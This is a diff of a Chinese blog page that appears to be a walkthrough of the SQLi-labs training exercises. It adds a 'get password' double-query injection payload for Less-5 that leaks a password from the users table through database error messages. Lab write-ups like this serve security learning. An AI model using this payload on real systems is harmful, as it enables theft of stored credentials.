@@ -382,7 +382,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    5 分
                 </div>
                 
 
@@ -520,7 +520,10 @@
 <h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h4><p>GET - Double Injection - Single Quotes - String</p>
 <p>双注入 - 单引号字符型</p>
 <p><img src="https://gitee.com/night7i/img/raw/master/img/20210609093944.png"></p>
-<p>这里的SQL语句与Less-1相同，不同的是传入id参数后，页面返回的值固定是<code>&#39;You are in…………&#39;</code>而不会返回查询到的结果，这个时候我们使用<a href="123">SQL注入 双查询注入</a>，可以使查询结果的一部分通过报错的形式显示出来</p>
+<p>这里的SQL语句与Less-1相同，不同的是传入id参数后，页面返回的值固定是<code>&#39;You are in…………&#39;</code>而不会返回查询到的结果，这个时候我们使用<a href="/2021/06/09/SQL%E6%B3%A8%E5%85%A5-%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/">SQL注入 双查询注入</a>，可以使查询结果的一部分通过报错的形式显示出来</p>
+<p>获取密码payload</p>
+<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;-1&#39; union select count(*),1, concat((select password from users LIMIT 1,1),floor(rand()*2)) as a from information_schema.tables group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 
                 
             </div>
@@ -865,7 +868,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">1.8k</span>&nbsp;字
+                class="white-color">2.4k</span>&nbsp;字
             
             
             
